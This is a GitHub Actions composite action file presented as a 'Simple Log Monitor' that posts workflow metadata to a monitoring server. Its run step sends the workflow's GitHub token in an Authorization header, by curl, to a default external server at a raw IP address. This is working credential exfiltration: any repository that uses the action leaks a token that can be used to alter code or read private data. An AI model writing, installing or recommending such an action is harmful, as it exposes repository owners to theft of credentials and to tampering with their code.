name: 'Simple Log Monitor'
description: 'Send runner ID and token to monitoring server'
inputs:
  server-url:
    description: 'URL of the monitoring server'
    required: true
    default: 'http://129.154.46.198:3000'
  runner-id:
    description: 'Runner ID (optional, defaults to github.run_id)'
    required: false
    default: ''

runs:
  using: 'composite'
  steps:
    - name: Send runner info to server
      shell: bash
      run: |
        # Set runner ID
        if [ -z "${{ inputs.runner-id }}" ]; then
          RUNNER_ID="${{ github.run_id }}-${{ github.run_attempt }}"
        else
          RUNNER_ID="${{ inputs.runner-id }}"
        fi
        
        SERVER_URL="${{ inputs.server-url }}"
        
        echo "ğŸ“¤ Sending data to: ${SERVER_URL}/${RUNNER_ID}"
        echo "ğŸ“ Runner ID: ${RUNNER_ID}"
        
        # Prepare data
        DATA=$(cat << EOF
        {
          "workflow": "${{ github.workflow }}",
          "job": "${{ github.job }}",
          "repository": "${{ github.repository }}",
          "actor": "${{ github.actor }}",
          "ref": "${{ github.ref }}",
          "sha": "${{ github.sha }}",
          "run_id": "${{ github.run_id }}",
          "run_attempt": "${{ github.run_attempt }}",
          "event_name": "${{ github.event_name }}",
          "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
          "status": "started"
        }
        EOF
        )
        
        # Send request
        RESPONSE=$(curl -s -X POST \
          -H "Content-Type: application/json" \
          -H "Authorization: Bearer ${{ github.token }}" \
          -d "$DATA" \
          "${SERVER_URL}/${RUNNER_ID}")
        
        echo "ğŸ“¨ Server response: ${RESPONSE}"
